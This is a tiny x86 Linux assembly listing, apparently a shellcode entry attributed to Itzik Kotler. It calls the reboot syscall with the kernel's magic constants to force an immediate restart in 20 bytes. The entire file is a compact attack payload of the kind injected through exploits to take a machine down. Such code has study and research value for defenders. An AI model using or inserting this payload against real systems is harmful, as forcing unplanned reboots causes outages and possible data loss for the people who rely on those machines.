#
# (linux/x86) reboot(LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2, LINUX_REBOOT_CMD_RESTART) - 20 bytes
# - Itzik Kotler <ik@ikotler.org>
#

.section .text
	.global _start
	_start:

		pushl $0x58
		popl %eax
		movl $0xfee1dead, %ebx
		movl $0x28121969, %ecx
		movl $0x01234567, %edx
		int $0x80

